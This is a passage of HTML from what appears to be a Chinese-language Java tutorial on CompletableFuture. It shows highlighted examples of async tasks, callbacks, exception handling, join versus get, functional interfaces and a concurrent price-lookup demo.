&lt;U&gt; CompletableFuture&lt;U&gt; <span class="title function_">supplyAsync</span><span class="params">(Supplier&lt;U&gt; supplier,</span></span><br><span class="line"><span class="params">                                                   Executor executor)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> asyncSupplyStage(screenExecutor(executor), supplier);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>runAsync case:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        CompletableFuture&lt;Void&gt; future = CompletableFuture.runAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;-----come in&quot;</span>);</span><br><span class="line">            <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;-----task is over&quot;</span>);</span><br><span class="line">            <span class="comment">//默认的线程池：ForkJoinPool.commonPool-worker-9</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line">        &#125;, Executors.newFixedThreadPool(<span class="number">3</span>));<span class="comment">//指定的线程池:pool-1-thread-1</span></span><br><span class="line">        System.out.println(future.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>supplyAsync case:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        CompletableFuture&lt;String&gt; completableFuture = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;-----come in&quot;</span>);</span><br><span class="line">            <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;task over&quot;</span>;</span><br><span class="line">            <span class="comment">//默认的线程池：ForkJoinPool.commonPool-worker-9</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line">        &#125;, Executors.newFixedThreadPool(<span class="number">3</span>));<span class="comment">//指定的线程池:pool-1-thread-1</span></span><br><span class="line"></span><br><span class="line">        System.out.println(completableFuture.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通用异步编程"><a href="#通用异步编程" class="headerlink" title="通用异步编程"></a>通用异步编程</h2><ul><li>CompletableFuture 通过<code>whenComplete</code><strong>减少阻塞和轮询</strong>（自动回调）</li><li>主线程结束后，CompletableFuture 默认使用的线程池会立即关闭，我们可以使用自定义的线程池</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;--------副线程come in&quot;</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> ThreadLocalRandom.current().nextInt(<span class="number">10</span>);<span class="comment">//产生随机数</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;-----结果---异常判断值---&quot;</span> + result);</span><br><span class="line">                <span class="comment">//---------------------异常情况的演示--------------------------------------</span></span><br><span class="line">                <span class="keyword">if</span> (result &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span> / <span class="number">0</span>;<span class="comment">//我们主动的给一个异常情况</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//------------------------------------------------------------------</span></span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;, threadPool).whenComplete((v, e) -&gt; &#123;<span class="comment">//没有异常,v是值，e是异常</span></span><br><span class="line">                <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;------------------计算完成，更新系统updateValue&quot;</span> + v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).exceptionally(e -&gt; &#123;<span class="comment">//有异常的情况</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                System.out.println(<span class="string">&quot;异常情况&quot;</span> + e.getCause() + <span class="string">&quot;\t&quot;</span> + e.getMessage());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//线程不要立刻结束，否则CompletableFuture默认使用的线程池会立刻关闭：暂停3秒钟线程</span></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;线程先去忙其他任务&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            threadPool.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="join和get区别"><a href="#join和get区别" class="headerlink" title="join和get区别"></a>join和get区别</h2><ul><li>功能几乎一样，区别在于编码时是否需要抛出异常<ul><li>get()方法需要抛出异常</li><li>join()方法不需要抛出异常</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;<span class="comment">//抛出异常</span></span><br><span class="line">        CompletableFuture&lt;String&gt; completableFuture = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello 12345&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(completableFuture.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;<span class="comment">//不抛出异常</span></span><br><span class="line">        CompletableFuture&lt;String&gt; completableFuture = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello 12345&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(completableFuture.join());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>异步任务结束或者出错时，会<strong>自动回调</strong>某个对象的方法；</li><li>主线程设置好毁掉后，不再关心异步任务的执行，异步任务之间可以顺序执行。</li></ul><h1 id="函数式接口"><a href="#函数式接口" class="headerlink" title="函数式接口"></a>函数式接口</h1><p>定义：任何<strong>接口</strong>，如果只包含<strong>唯一一个</strong>抽象方法，那么它就是一个<strong>函数式接口</strong>。对于函数式接口，我们可以通过<strong>lambda表达式</strong>来创建该接口的对象。</p><p>常见函数式接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Function</span>&lt;T, R&gt; &#123;</span><br><span class="line">    R <span class="title function_">apply</span><span class="params">(T t)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Consumer</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(T t)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Supplier</span>&lt;T&gt; &#123;</span><br><span class="line">    T <span class="title function_">get</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BiConsumer</span>&lt;T, U&gt; &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(T t, U u)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><table><thead><tr><th>函数式接口名称</th><th>方法名称</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td>Runnable</td><td>run</td><td>无参数</td><td>无返回值</td></tr><tr><td>Function</td><td>apply</td><td>1个参数</td><td>有返回值</td></tr><tr><td>Consume</td><td>accept</td><td>1个参数</td><td>无返回值</td></tr><tr><td>Supplier</td><td>get</td><td>没有参数</td><td>有返回值</td></tr><tr><td>Biconsumer</td><td>accept</td><td>2个参数</td><td>无返回值</td></tr></tbody></table><h1 id="电商比价案例"><a href="#电商比价案例" class="headerlink" title="电商比价案例"></a>电商比价案例</h1><p>经常出现在等待某条 SQL 执行完成后，再继续执行下一条 SQL ，而这两条 SQL 本身是并无关系的，可以同时进行执行的。我们希望能够两条 SQL 同时进行处理，而不是等待其中的某一条 SQL 完成后，再继续下一条。</p><p>同理，对于分布式微服务的调用，按照实际业务，如果是无关联step by step的业务，可以尝试是否可以多箭齐发，同时调用。</p><hr><p>案例需求需求说明：<br>同一款产品，同时搜索出该款产品在各大电商平台的售价；</p><p>输出返回：<br>出来结果希望是同款产品的在不同地方的价格清单列表， 返回一个<code>List&lt;String&gt;</code><br>《mysql》in jd price is 88.05<br>《mysql》in dang dang price is 86.11<br>《mysql》in tao bao price is 90.43</p><p>解决方案：</p><ol><li>stepbystep， 按部就班， 查完京东查淘宝， 查完淘宝查天猫</li><li>all in，万箭齐发，一口气多线程异步任务同时查询</li></ol><p>实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> List&lt;NetMall&gt; list = Arrays.asList(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">NetMall</span>(<span class="string">&quot;jd&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">NetMall</span>(<span class="string">&quot;tmall&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">NetMall</span>(<span class="string">&quot;pdd&quot;</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">NetMall</span>(<span class="string">&quot;taobao&quot;</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">findPriceSync</span><span class="params">(List&lt;NetMall&gt; list, String productName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.stream().map(mall -&gt; String.format(productName + <span class="string">&quot; %s price is %.2f&quot;</span>,</span><br><span class="line">                        mall.getNetMallName(),</span><br><span class="line">                        mall.getPriceByName(productName)))</span><br><span class="line">                .collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">findPriceASync</span><span class="params">(List&lt;NetMall&gt; list, String productName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.stream().map(mall -&gt; CompletableFuture.supplyAsync(() -&gt; String.format(productName + <span class="string">&quot; %s price is %.2f&quot;</span>,</span><br><span class="line">                mall.getNetMallName(),</span><br><span class="line">                mall.getPriceByName(productName))))</span><br><span class="line">                .collect(Collectors.toList())<span class="comment">//和下面那行都不能省略，不然会串行调用join</span></span><br><span class="line">                .stream()</span><br><span class="line">                .map(CompletableFuture::join)</span><br><span class="line">                .collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        List&lt;String&gt; list1 = findPriceSync(list, <span class="string">&quot;thinking in java&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String element : list1) &#123;</span><br><span class="line">            System.out.println(element);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;----costTime: &quot;</span> + (endTime - startTime) + <span class="string">&quot; 毫秒&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime2</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        List&lt;String&gt; list2 = findPriceASync(list, <span class="string">&quot;thinking in java&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String element : list2) &#123;</span><br><span class="line">            System.out.println(element);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime2</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;----costTime: &quot;</span> + (endTime2 - startTime2) + <span class="string">&quot; 毫秒&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NetMall</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String netMallName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNetMallName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> netMallName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NetMall</span><span class="params">(String netMallName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.netMallName = netMallName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPriceByName</span><span class="params">(String productName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> calcPrice(productName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">calcPrice</span><span class="params">(String productName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ThreadLocalRandom.current().nextDouble() + productName.charAt(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CompletableFuture常用方法"><a href="#CompletableFuture常用方法" class="headerlink" title="CompletableFuture常用方法"></a>CompletableFuture常用方法</h1><h2 id="获得结果和触发计算"><a href="#获得结果和触发计算" class="headerlink" title="获得结果和触发计算"></a>获得结果和触发计算</h2><p>获取结果：</p><ul><li><code>public T get()</code>， 不见不散，容易阻塞</li><li><code>public T get(long timeout,TimeUnit unit)</code>，过时不候，超时会抛出异常</li><li><code>public T join()</code>， 类似于get()，区别在于是否需要抛出异常</li><li><code>public T getNow(T valueIfAbsent)</code>，立即获取结果不阻塞：计算完，返回计算完成后的结果；没算完，返回设定的valueAbsent</li></ul><p>主动触发计算：</p><ul><li><code>public boolean complete(T value)</code>，是否立即打断get()方法返回括号值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        CompletableFuture&lt;String&gt; completableFuture = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">2</span>);<span class="comment">//执行需要2秒</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;task over&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">1</span>);<span class="comment">//等待需要1秒</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        System.out.println(completableFuture.getNow(&quot;replacement value&quot;));//执行时间超过等待时间，返回括号里的值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行时间超过等待时间，返回true + 括号里的值</span></span><br><span class="line">        <span class="comment">//执行时间小于等待时间，返回false + completableFuture的返回值</span></span><br><span class="line">        System.out.println(completableFuture.complete(<span class="string">&quot;completeValue&quot;</span>) + <span class="string">&quot;\t&quot;</span> + completableFuture.get());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对计算结果进行处理"><a href="#对计算结果进行处理" class="headerlink" title="对计算结果进行处理"></a>对计算结果进行处理</h2><ul><li><code>thenApply </code>计算结果存在在依赖关系，使得线程串行化。因为依赖关系，所以一旦有异常，直接叫停。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">        &#125;).thenApply(f -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">1</span>;</span><br><span class="line">        &#125;).thenApply(f -&gt; &#123;</span><br><span class="line">            <span class="comment">//int age = 10/0; // 异常情况：那步出错就停在那步。</span></span><br><span class="line">            System.out.println(<span class="string">&quot;333&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">1</span>;</span><br><span class="line">        &#125;).whenCompleteAsync((v, e) -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;*****v: &quot;</span> + v);</span><br><span class="line">        &#125;).exceptionally(e -&gt; &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----主线程结束，END&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主线程不要立刻结束，否则CompletableFuture默认使用的线程池会立刻关闭:</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>handle </code>类似于thenApply，但是有异常的话仍然可以往下走一步。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 异常情况：有异常也可以往下一步走，根据带的异常参数可以进一步处理</span></span><br><span class="line">        CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">            &#125; <span 